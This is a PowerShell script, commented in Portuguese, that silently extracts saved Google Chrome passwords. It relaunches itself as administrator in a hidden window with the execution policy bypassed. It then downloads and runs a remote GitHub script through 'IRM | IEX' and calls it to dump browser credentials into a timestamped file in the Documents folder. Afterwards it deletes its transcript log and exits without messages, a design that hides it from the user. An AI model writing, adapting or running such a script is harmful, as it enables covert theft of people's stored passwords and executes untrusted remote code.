# ExtrairSenhas.ps1 - Versão COMPLETAMENTE SILENCIOSA

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Documents
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
    if (-not (Test-Path $pastaDocuments)) {
        $pastaDocuments = Join-Path $env:USERPROFILE "Meus Documentos"
    }
}

# Nome do arquivo com data/hora
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Carrega o script do GitHub silenciosamente
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Executa e captura a saída usando transcrição (silenciosamente)
$tempLog = Join-Path $env:TEMP "temp_senhas.log"
Start-Transcript -Path $tempLog -Append | Out-Null

Invoke-PowerChrome -Browser Chrome | Out-Null

Stop-Transcript | Out-Null

# Copia o conteúdo do log para o arquivo final
$conteudo = Get-Content $tempLog -Raw
$conteudoLimpo = $conteudo -replace '(?s)^.*?Windows PowerShell transcript start.*?End of transcript\s*', ''
$conteudoLimpo | Out-File -FilePath $arquivoSaida -Encoding UTF8

# Limpa o arquivo temporário
Remove-Item $tempLog -Force -ErrorAction SilentlyContinue

# Sai silenciosamente (sem mensagens, sem pausa)
exit
